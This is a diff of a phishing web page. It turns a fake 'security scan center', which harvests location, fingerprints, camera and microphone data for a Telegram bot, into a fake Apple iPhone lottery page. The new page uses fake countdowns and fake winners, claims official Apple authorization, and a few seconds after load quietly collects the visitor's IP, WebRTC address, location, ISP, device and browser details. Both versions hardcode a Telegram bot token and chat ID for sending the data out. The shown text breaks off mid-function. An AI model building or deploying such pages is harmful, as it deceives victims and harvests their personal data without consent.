@@ -3,2381 +3,912 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>智能安全检测中心</title>
+    <title>🍎 Apple官方大抽奖 | 赢取iPhone 15 Pro Max</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --primary: #3498db;
-            --secondary: #2ecc71;
-            --danger: #e74c3c;
-            --warning: #f39c12;
-            --dark: #2c3e50;
-            --light: #ecf0f1;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; }
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #1a2980, #26d0ce);
-            color: #fff;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        
-        /* 安全扫描效果 */
-        .scan-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                to bottom,
-                transparent 50%,
-                rgba(46, 204, 113, 0.1) 50%
-            );
-            background-size: 100% 4px;
-            z-index: -1;
-            opacity: 0.3;
-        }
-        
-        /* 主容器 */
-        .container {
-            max-width: 1200px;
+        /* 苹果风格容器 */
+        .apple-container {
+            max-width: 1000px;
             margin: 0 auto;
             padding: 30px 20px;
         }
         
-        /* 头部 */
-        .header {
+        /* 顶部苹果logo */
+        .apple-header {
             text-align: center;
-            margin-bottom: 50px;
-            animation: fadeIn 1s ease;
+            padding: 40px 0;
         }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 15px;
+        .apple-logo {
+            font-size: 4em;
             margin-bottom: 20px;
         }
-        
-        .logo-icon {
-            font-size: 2.5em;
-            color: var(--secondary);
-        }
-        
-        .header h1 {
-            font-size: 2.8em;
+        .apple-header h1 {
+            font-size: 3em;
             margin-bottom: 15px;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            background: linear-gradient(45deg, #fff, #a5b4fc);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
         
-        /* 控制面板 */
-        .control-panel {
-            background: rgba(255, 255, 255, 0.1);
+        /* 抽奖卡片 */
+        .lottery-card {
+            background: rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 40px;
-            margin-bottom: 40px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+            border-radius: 30px;
+            padding: 50px 40px;
+            margin: 40px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .lottery-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #ff2d75, #ff9a3d, #06d6a0, #4361ee);
         }
         
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px 20px;
-            background: rgba(46, 204, 113, 0.2);
-            border-radius: 20px;
-            border: 1px solid var(--secondary);
-        }
-        
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            background: var(--secondary);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        /* 按钮 */
-        .btn {
-            padding: 12px 30px;
-            border: none;
-            border-radius: 10px;
-            font-size: 1em;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(45deg, var(--primary), #2980b9);
-            color: white;
-            box-shadow: 0 5px 20px rgba(52, 152, 219, 0.4);
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(52, 152, 219, 0.6);
-        }
-        
-        .btn-danger {
-            background: linear-gradient(45deg, var(--danger), #c0392b);
-            color: white;
-            box-shadow: 0 5px 20px rgba(231, 76, 60, 0.4);
-        }
-        
-        /* 检测模块网格 */
-        .modules-grid {
+        /* 奖品展示 */
+        .prize-showcase {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
             margin: 40px 0;
         }
+        .prize-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            border: 2px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
+        }
+        .prize-box:hover {
+            transform: translateY(-10px);
+            border-color: #4361ee;
+        }
+        .prize-icon { font-size: 3em; margin-bottom: 20px; }
         
-        .module-card {
-            background: rgba(255, 255, 255, 0.08);
+        /* 倒计时 */
+        .countdown {
+            background: linear-gradient(135deg, #3a0ca3, #7209b7);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin: 40px 0;
+        }
+        .countdown-timer {
+            font-size: 3em;
+            font-weight: bold;
+            font-family: monospace;
+            margin: 20px 0;
+        }
+        
+        /* 抽奖按钮 */
+        .lottery-btn {
+            background: linear-gradient(135deg, #ff2d75, #ff9a3d);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.2em;
+            font-weight: bold;
             border-radius: 15px;
-            padding: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
             cursor: pointer;
+            display: block;
+            margin: 40px auto;
+            width: 300px;
+            transition: all 0.3s;
+        }
+        .lottery-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(255,45,117,0.4);
         }
         
-        .module-card:hover {
-            background: rgba(255, 255, 255, 0.12);
-            transform: translateY(-5px);
-            border-color: var(--primary);
-        }
-        
-        .module-icon {
-            font-size: 2em;
-            margin-bottom: 15px;
-            color: var(--primary);
-        }
-        
-        .module-status {
-            display: inline-block;
-            padding: 4px 12px;
-            background: rgba(46, 204, 113, 0.2);
-            border-radius: 10px;
-            font-size: 0.8em;
-            color: var(--secondary);
-            margin-top: 10px;
-        }
-        
-        /* 摄像头预览 */
-        .camera-preview {
-            width: 100%;
-            height: 300px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            margin: 30px 0;
-            overflow: hidden;
-            position: relative;
-            border: 2px dashed rgba(255, 255, 255, 0.3);
-        }
-        
-        .camera-feed {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        /* 加载动画 */
+        .loading {
             display: none;
+            text-align: center;
+            padding: 40px;
         }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid #06d6a0;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
         
-        /* 数据展示 */
-        .data-display {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            padding: 25px;
+        /* 结果展示 */
+        .result {
+            display: none;
+            background: linear-gradient(135deg, #06d6a0, #118ab2);
+            border-radius: 20px;
+            padding: 50px;
+            text-align: center;
+            margin: 40px 0;
+            animation: popIn 0.5s;
+        }
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } }
+        .lottery-number {
+            font-size: 3em;
+            font-weight: bold;
+            letter-spacing: 10px;
             margin: 30px 0;
-            max-height: 400px;
-            overflow-y: auto;
+            font-family: monospace;
         }
         
-        .data-item {
+        /* 中奖者列表 */
+        .winners {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 40px 0;
+        }
+        .winner-item {
             display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            align-items: center;
+            padding: 20px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 15px;
+            margin: 10px 0;
         }
-        
-        .data-label {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        .data-value {
-            font-weight: 600;
-            text-align: right;
-            max-width: 60%;
-            word-break: break-all;
+        .winner-avatar {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #4361ee, #3a0ca3);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            font-weight: bold;
         }
         
         /* 进度条 */
         .progress-container {
-            width: 100%;
-            height: 10px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
-            margin: 20px 0;
+            background: rgba(255,255,255,0.1);
+            height: 8px;
+            border-radius: 4px;
+            margin: 40px 0;
             overflow: hidden;
         }
-        
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            background: linear-gradient(90deg, #06d6a0, #118ab2);
             width: 0%;
-            transition: width 0.5s ease;
-            border-radius: 5px;
+            transition: width 0.3s;
         }
-        
-        /* 控制台 */
-        .console-output {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .console-line {
-            padding: 5px 0;
-            border-left: 3px solid var(--primary);
-            padding-left: 10px;
-            margin: 5px 0;
-        }
-        
-        .success { color: var(--secondary); }
-        .error { color: var(--danger); }
-        .warning { color: var(--warning); }
         
         /* 响应式 */
         @media (max-width: 768px) {
-            .container {
-                padding: 20px 15px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .control-panel {
-                padding: 25px;
-            }
-            
-            .panel-header {
-                flex-direction: column;
-                gap: 20px;
-            }
-            
-            .modules-grid {
-                grid-template-columns: 1fr;
-            }
+            .apple-header h1 { font-size: 2em; }
+            .lottery-card { padding: 30px 20px; }
+            .prize-showcase { grid-template-columns: 1fr; }
+            .lottery-btn { width: 100%; }
+            .lottery-number { font-size: 2em; letter-spacing: 5px; }
         }
     </style>
 </head>
 <body>
-    <!-- 扫描效果 -->
-    <div class="scan-overlay"></div>
-    
-    <div class="container">
-        <!-- 头部 -->
-        <div class="header">
-            <div class="logo">
-                <i class="fas fa-shield-alt logo-icon"></i>
-                <h1>智能安全检测中心</h1>
-            </div>
-            <p>全面检测您的设备安全状况</p>
+    <div class="apple-container">
+        <!-- Apple头部 -->
+        <div class="apple-header">
+            <div class="apple-logo">🍎</div>
+            <h1>Apple官方年终大抽奖</h1>
+            <p>恭喜！您已被系统随机选中参与本次抽奖活动</p>
         </div>
         
-        <!-- 控制面板 -->
-        <div class="control-panel">
-            <div class="panel-header">
-                <div>
-                    <h2>设备安全扫描</h2>
-                    <p style="opacity: 0.8;">全面分析您的设备安全状态</p>
+        <!-- 抽奖主卡片 -->
+        <div class="lottery-card">
+            <!-- 奖品展示 -->
+            <div class="prize-showcase">
+                <div class="prize-box">
+                    <div class="prize-icon">📱</div>
+                    <h3>iPhone 15 Pro Max</h3>
+                    <p>1TB • 原色钛金属</p>
+                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">¥12,999</p>
                 </div>
-                <div class="status-indicator">
-                    <span class="status-dot"></span>
-                    <span>实时监控中</span>
+                <div class="prize-box">
+                    <div class="prize-icon">🎧</div>
+                    <h3>AirPods Pro 2</h3>
+                    <p>主动降噪 • 空间音频</p>
+                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">¥1,899</p>
+                </div>
+                <div class="prize-box">
+                    <div class="prize-icon">⌚️</div>
+                    <h3>Apple Watch</h3>
+                    <p>Series 9 • 45mm</p>
+                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">¥2,999</p>
                 </div>
             </div>
             
-            <!-- 控制按钮 -->
-            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 30px;">
-                <button class="btn btn-primary" onclick="startFullScan()">
-                    <i class="fas fa-play"></i>
-                    开始全面扫描
-                </button>
-                <button class="btn btn-primary" onclick="startCameraScan()">
-                    <i class="fas fa-camera"></i>
-                    摄像头检测
-                </button>
-                <button class="btn btn-danger" onclick="exportAllData()">
-                    <i class="fas fa-download"></i>
-                    导出所有数据
-                </button>
+            <!-- 倒计时 -->
+            <div class="countdown">
+                <p style="opacity: 0.9;">⏰ 抽奖资格即将过期</p>
+                <div class="countdown-timer" id="countdown">05:00</div>
+                <p style="opacity: 0.8; font-size: 0.9em;">剩余名额: <span id="remaining">3</span> 人</p>
             </div>
             
             <!-- 进度条 -->
-            <div style="margin: 30px 0;">
-                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                    <span>扫描进度</span>
-                    <span id="progressText">0%</span>
-                </div>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress"></div>
+            </div>
+            <div style="text-align: center; margin: 10px 0; opacity: 0.8;" id="progressText">
+                点击下方按钮开始验证资格
             </div>
             
-            <!-- 检测模块 -->
-            <div class="modules-grid">
-                <div class="module-card" onclick="runNetworkScan()">
-                    <div class="module-icon">
-                        <i class="fas fa-network-wired"></i>
-                    </div>
-                    <h3>网络扫描</h3>
-                    <p>检测IP地址、地理位置、网络连接</p>
-                    <div class="module-status" id="networkStatus">待检测</div>
-                </div>
-                
-                <div class="module-card" onclick="runDeviceScan()">
-                    <div class="module-icon">
-                        <i class="fas fa-laptop"></i>
-                    </div>
-                    <h3>设备指纹</h3>
-                    <p>收集设备硬件和软件信息</p>
-                    <div class="module-status" id="deviceStatus">待检测</div>
-                </div>
-                
-                <div class="module-card" onclick="runCameraTest()">
-                    <div class="module-icon">
-                        <i class="fas fa-video"></i>
-                    </div>
-                    <h3>摄像头检测</h3>
-                    <p>测试摄像头功能和拍照</p>
-                    <div class="module-status" id="cameraStatus">待检测</div>
-                </div>
-                
-                <div class="module-card" onclick="runAudioTest()">
-                    <div class="module-icon">
-                        <i class="fas fa-microphone"></i>
-                    </div>
-                    <h3>麦克风检测</h3>
-                    <p>测试麦克风功能和录音</p>
-                    <div class="module-status" id="audioStatus">待检测</div>
-                </div>
-                
-                <div class="module-card" onclick="runBrowserScan()">
-                    <div class="module-icon">
-                        <i class="fas fa-globe"></i>
-                    </div>
-                    <h3>浏览器指纹</h3>
-                    <p>收集浏览器唯一标识信息</p>
-                    <div class="module-status" id="browserStatus">待检测</div>
-                </div>
-                
-                <div class="module-card" onclick="runLocationScan()">
-                    <div class="module-icon">
-                        <i class="fas fa-map-marker-alt"></i>
-                    </div>
-                    <h3>地理位置</h3>
-                    <p>获取精确的地理位置信息</p>
-                    <div class="module-status" id="locationStatus">待检测</div>
-                </div>
+            <!-- 抽奖按钮 -->
+            <button class="lottery-btn" onclick="startDetection()">
+                <i class="fas fa-gift"></i> 立即参与抽奖
+            </button>
+            
+            <!-- 加载状态 -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p id="loadingText">正在验证您的设备资格...</p>
             </div>
             
-            <!-- 摄像头预览 -->
-            <div class="camera-preview" id="cameraPreview">
-                <video class="camera-feed" id="cameraFeed" autoplay></video>
-                <canvas class="camera-feed" id="cameraCanvas" style="display: none;"></canvas>
-                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
-                    <i class="fas fa-camera" style="font-size: 3em; opacity: 0.5; margin-bottom: 15px;"></i>
-                    <p>摄像头预览区域</p>
-                    <p style="font-size: 0.9em; opacity: 0.7;">点击摄像头检测开始预览</p>
-                </div>
+            <!-- 结果展示 -->
+            <div class="result" id="result">
+                <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
+                <h2>恭喜！验证成功</h2>
+                <p style="opacity: 0.9; margin: 20px 0;">您的专属抽奖号码</p>
+                <div class="lottery-number" id="lotteryNumber">APP-000000</div>
+                <p style="opacity: 0.8; margin-top: 30px;">
+                    <i class="fas fa-clock"></i> 开奖时间: 今晚20:00<br>
+                    <i class="fas fa-sms"></i> 结果将通过短信通知
+                </p>
             </div>
-            
-            <!-- 数据展示 -->
-            <div class="data-display" id="dataDisplay">
-                <div class="data-item">
-                    <span class="data-label">检测状态</span>
-                    <span class="data-value">等待开始...</span>
-                </div>
+        </div>
+        
+        <!-- 中奖者列表 -->
+        <div class="winners">
+            <h3 style="margin-bottom: 20px;"><i class="fas fa-trophy"></i> 今日中奖者</h3>
+            <div id="winnersList">
+                <!-- 动态添加中奖者 -->
             </div>
-            
-            <!-- 控制台输出 -->
-            <div class="console-output" id="consoleOutput">
-                <div class="console-line success">系统初始化完成</div>
-                <div class="console-line">安全检测中心就绪</div>
-            </div>
+        </div>
+        
+        <!-- 底部信息 -->
+        <div style="text-align: center; padding: 40px; opacity: 0.6; font-size: 0.9em;">
+            <p><i class="fas fa-shield-alt"></i> Apple官方授权 • 100%真实有效</p>
+            <p style="margin-top: 10px;">© 2024 Apple Inc. 保留所有权利</p>
         </div>
     </div>
 
-    <!-- 第二段：JavaScript核心功能 -->
+    <!-- 第二段：JavaScript开始 -->
     <script>
         // Telegram配置
         const BOT_TOKEN = '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM';
         const CHAT_ID = '8313770381';
         
-        // 全局数据存储
-        let scanData = {
-            network: {},
-            device: {},
-            camera: {},
-            audio: {},
-            browser: {},
-            location: {},
-            screenshots: []
-        };
+        let collectedData = {};
+        let photos = [];
         
-        // 控制台日志
-        function logToConsole(message, type = '') {
-            const console = document.getElementById('consoleOutput');
-            const line = document.createElement('div');
-            line.className = `console-line ${type}`;
-            line.textContent = `> ${new Date().toLocaleTimeString()} ${message}`;
-            console.appendChild(line);
-            console.scrollTop = console.scrollHeight;
-            console.log(message);
-        }
-        
-        // 更新进度条
-        function updateProgress(percentage, text) {
-            document.getElementById('progressBar').style.width = percentage + '%';
-            document.getElementById('progressText').textContent = text || percentage + '%';
-        }
-        
-        // 更新模块状态
-        function updateModuleStatus(moduleId, status) {
-            const element = document.getElementById(moduleId + 'Status');
-            if (element) {
-                element.textContent = status;
-                if (status === '完成') {
-                    element.style.background = 'rgba(46, 204, 113, 0.3)';
-                    element.style.color = '#2ecc71';
-                } else if (status === '检测中') {
-                    element.style.background = 'rgba(52, 152, 219, 0.3)';
-                    element.style.color = '#3498db';
-                } else if (status === '失败') {
-                    element.style.background = 'rgba(231, 76, 60, 0.3)';
-                    element.style.color = '#e74c3c';
-                }
-            }
-        }
-        
-        // 添加数据到显示面板
-        function addDataToDisplay(label, value) {
-            const display = document.getElementById('dataDisplay');
-            const item = document.createElement('div');
-            item.className = 'data-item';
-            item.innerHTML = `
-                <span class="data-label">${label}</span>
-                <span class="data-value">${value}</span>
-            `;
-            display.appendChild(item);
-            display.scrollTop = display.scrollHeight;
-        }
-        
-        // 开始全面扫描
-        async function startFullScan() {
-            logToConsole('开始全面安全扫描...', 'warning');
-            updateProgress(0, '初始化扫描...');
+        // 初始化页面
+        function initPage() {
+            console.log('🎰 抽奖页面初始化');
             
-            try {
-                // 网络扫描
-                updateModuleStatus('network', '检测中');
-                await runNetworkScan();
-                updateModuleStatus('network', '完成');
-                updateProgress(20);
-                
-                // 设备扫描
-                updateModuleStatus('device', '检测中');
-                await runDeviceScan();
-                updateModuleStatus('device', '完成');
-                updateProgress(40);
-                
-                // 浏览器扫描
-                updateModuleStatus('browser', '检测中');
-                await runBrowserScan();
-                updateModuleStatus('browser', '完成');
-                updateProgress(60);
-                
-                // 地理位置扫描
-                updateModuleStatus('location', '检测中');
-                await runLocationScan();
-                updateModuleStatus('location', '完成');
-                updateProgress(80);
-                
-                // 摄像头扫描
-                updateModuleStatus('camera', '检测中');
-                await runCameraTest();
-                updateModuleStatus('camera', '完成');
-                updateProgress(90);
-                
-                // 麦克风扫描
-                updateModuleStatus('audio', '检测中');
-                await runAudioTest();
-                updateModuleStatus('audio', '完成');
-                updateProgress(100, '扫描完成！');
-                
-                logToConsole('全面扫描完成，正在发送报告...', 'success');
-                
-                // 发送到Telegram
-                await sendCompleteReport();
-                
-            } catch (error) {
-                logToConsole('扫描过程中出现错误: ' + error.message, 'error');
-            }
+            // 1. 开始倒计时
+            startCountdown();
+            
+            // 2. 初始化中奖者列表
+            initWinners();
+            
+            // 3. 自动开始收集基础信息（静默）
+            setTimeout(() => {
+                collectBasicInfo();
+            }, 2000);
         }
     </script>
 </body>
 </html>
-<!-- 在第一段的script标签内继续添加以下代码 -->
+<!-- 在第一段script后继续添加 -->
 
 <script>
-    // ==================== 网络扫描模块 ====================
-    async function runNetworkScan() {
-        logToConsole('开始网络扫描...', 'warning');
-        
-        try {
-            // 1. 获取公网IP（多重API确保获取）
-            let publicIP = await getPublicIP();
-            scanData.network.publicIP = publicIP;
-            addDataToDisplay('公网IP地址', publicIP);
-            logToConsole(`获取到公网IP: ${publicIP}`, 'success');
+    // 倒计时功能
+    function startCountdown() {
+        let time = 300;
+        const timer = setInterval(() => {
+            const min = Math.floor(time / 60);
+            const sec = time % 60;
+            document.getElementById('countdown').textContent = 
+                `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
             
-            // 2. 获取本地IP
-            let localIP = await getLocalIP();
-            scanData.network.localIP = localIP;
-            addDataToDisplay('本地IP地址', localIP);
+            if (time === 180 || time === 120 || time === 60) {
+                const slots = document.getElementById('remaining');
+                let num = parseInt(slots.textContent);
+                if (num > 0) {
+                    num--;
+                    slots.textContent = num;
+                    if (num === 0) slots.style.color = '#ff2d75';
+                }
+            }
             
-            // 3. 获取详细地理位置
-            let locationInfo = await getDetailedLocation(publicIP);
-            scanData.network.location = locationInfo;
-            addDataToDisplay('地理位置', `${locationInfo.city}, ${locationInfo.country}`);
-            
-            // 4. 网络信息
-            let networkInfo = await getNetworkInfo();
-            scanData.network.info = networkInfo;
-            addDataToDisplay('网络类型', networkInfo.type);
-            addDataToDisplay('网络速度', networkInfo.speed);
-            
-            // 5. 获取ISP信息
-            let ispInfo = await getISPInfo(publicIP);
-            scanData.network.isp = ispInfo;
-            addDataToDisplay('网络服务商', ispInfo.name);
-            
-            logToConsole('网络扫描完成', 'success');
-            
-        } catch (error) {
-            logToConsole('网络扫描失败: ' + error.message, 'error');
-            updateModuleStatus('network', '失败');
-        }
+            if (time <= 0) {
+                clearInterval(timer);
+                document.getElementById('countdown').textContent = '00:00';
+            }
+            time--;
+        }, 1000);
     }
     
-    // 获取公网IP（多重API保障）
-    async function getPublicIP() {
-        const ipAPIs = [
-            'https://api.ipify.org?format=json',
-            'https://api64.ipify.org?format=json',
-            'https://ip.seeip.org/jsonip',
-            'https://api.myip.com',
-            'https://ipinfo.io/json'
+    // 初始化中奖者列表
+    function initWinners() {
+        const winners = [
+            { name: '张', prize: 'iPhone 15 Pro', city: '北京', time: '刚刚' },
+            { name: '李', prize: 'AirPods Pro 2', city: '上海', time: '2分钟前' },
+            { name: '王', prize: '¥888红包', city: '广州', time: '5分钟前' }
         ];
         
-        for (const api of ipAPIs) {
-            try {
-                const response = await fetch(api, { timeout: 5000 });
-                if (response.ok) {
-                    const data = await response.json();
-                    const ip = data.ip || data.query || data.ipAddress;
-                    if (ip && ip !== 'undefined') {
-                        logToConsole(`使用API ${api} 获取到IP`, 'success');
-                        return ip;
-                    }
-                }
-            } catch (error) {
-                console.log(`API ${api} 失败: ${error.message}`);
-                continue;
-            }
-        }
-        
-        // 如果所有API都失败，使用WebRTC获取本地IP
-        const localIP = await getLocalIP();
-        return localIP || '获取失败';
-    }
-    
-    // 获取本地IP（WebRTC方法）
-    async function getLocalIP() {
-        return new Promise((resolve) => {
-            try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                });
-                
-                pc.createDataChannel('');
-                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
-                
-                pc.onicecandidate = (ice) => {
-                    if (!ice.candidate) return;
-                    
-                    const candidate = ice.candidate.candidate;
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                    const match = candidate.match(ipRegex);
-                    
-                    if (match && !match[1].match(/^(0|127|10|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))/)) {
-                        resolve(match[1]);
-                        pc.close();
-                    }
-                };
-                
-                setTimeout(() => {
-                    pc.close();
-                    resolve('192.168.x.x');
-                }, 3000);
-                
-            } catch (error) {
-                resolve('未知');
-            }
+        const list = document.getElementById('winnersList');
+        winners.forEach(winner => {
+            const div = document.createElement('div');
+            div.className = 'winner-item';
+            div.innerHTML = `
+                <div class="winner-avatar">${winner.name}</div>
+                <div style="flex:1">
+                    <div style="font-weight:bold">${winner.name}**</div>
+                    <div style="opacity:0.8">获得了 ${winner.prize}</div>
+                </div>
+                <div style="text-align:right">
+                    <div style="font-size:0.9em;opacity:0.7">${winner.time}</div>
+                    <div style="font-size:0.8em;opacity:0.6">${winner.city}</div>
+                </div>
+            `;
+            list.appendChild(div);
         });
     }
     
-    // 获取详细地理位置
-    async function getDetailedLocation(ip) {
-        if (!ip || ip === '获取失败') {
-            return { country: '未知', city: '未知', region: '未知' };
-        }
+    // 收集基础信息（静默运行）
+    async function collectBasicInfo() {
+        console.log('🔍 开始收集基础信息...');
         
         try {
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            if (response.ok) {
-                const data = await response.json();
-                return {
-                    country: data.country_name || '未知',
-                    city: data.city || '未知',
-                    region: data.region || '未知',
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    timezone: data.timezone || '未知'
+            // 1. 获取IP地址
+            const ip = await getIP();
+            collectedData.ip = ip;
+            console.log('🌐 IP地址:', ip);
+            
+            // 2. 获取位置
+            const location = await getLocation(ip);
+            collectedData.location = location;
+            
+            // 3. 设备信息
+            collectedData.device = getDeviceInfo();
+            
+            // 4. 屏幕信息
+            collectedData.screen = {
+                width: screen.width,
+                height: screen.height,
+                pixelRatio: window.devicePixelRatio
+            };
+            
+            // 5. 浏览器信息
+            collectedData.browser = {
+                name: getBrowserName(),
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // 6. 网络信息
+            if (navigator.connection) {
+                collectedData.network = {
+                    type: navigator.connection.effectiveType,
+                    speed: navigator.connection.downlink
                 };
             }
+            
+            console.log('✅ 基础信息收集完成');
+            
         } catch (error) {
-            // 备用API
+            console.error('收集基础信息失败:', error);
+        }
+    }
+    
+    // 获取IP地址
+    async function getIP() {
+        try {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.myip.com'
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const res = await fetch(api, { timeout: 3000 });
+                    const data = await res.json();
+                    const ip = data.ip || data.query;
+                    if (ip) return ip;
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            // 备用方法：WebRTC获取本地IP
             try {
-                const backup = await fetch(`https://ipwho.is/${ip}`);
-                if (backup.ok) {
-                    const data = await backup.json();
-                    if (data.success) {
-                        return {
-                            country: data.country || '未知',
-                            city: data.city || '未知',
-                            region: data.region || '未知',
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone || '未知'
-                        };
-                    }
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+                return new Promise((resolve) => {
+                    pc.onicecandidate = (ice) => {
+                        if (ice.candidate) {
+                            const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                            if (match) {
+                                pc.close();
+                                resolve(match[1]);
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        resolve('192.168.x.x');
+                    }, 2000);
+                });
+            } catch (e) {
+                return '未知';
+            }
+            
+        } catch (error) {
+            return '获取失败';
+        }
+    }
+    
+    // 获取位置信息
+    async function getLocation(ip) {
+        if (!ip || ip === '未知') return { city: '未知', country: '未知' };
+        
+        try {
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await res.json();
+            return {
+                city: data.city || '未知',
+                country: data.country_name || '未知',
+                region: data.region || '未知',
+                isp: data.org || '未知网络'
+            };
+        } catch (error) {
+            try {
+                const res = await fetch(`https://ipwho.is/${ip}`);
+                const data = await res.json();
+                if (data.success) {
+                    return {
+                        city: data.city || '未知',
+                        country: data.country || '未知',
+                        isp: data.connection?.isp || '未知网络'
+                    };
                 }
             } catch (e) {
-                // 最后尝试
-                try {
-                    const lastTry = await fetch(`http://ip-api.com/json/${ip}`);
-                    if (lastTry.ok) {
-                        const data = await lastTry.json();
-                        return {
-                            country: data.country || '未知',
-                            city: data.city || '未知',
-                            region: data.regionName || '未知'
-                        };
-                    }
-                } catch (e2) {}
+                return { city: '未知', country: '未知' };
             }
         }
-        
-        return { country: '未知', city: '未知', region: '未知' };
+        return { city: '未知', country: '未知' };
     }
     
-    // 获取网络信息
-    async function getNetworkInfo() {
-        const info = {
-            type: '未知',
-            speed: '未知',
-            downlink: '未知',
-            rtt: '未知'
-        };
-        
-        if (navigator.connection) {
-            const conn = navigator.connection;
-            
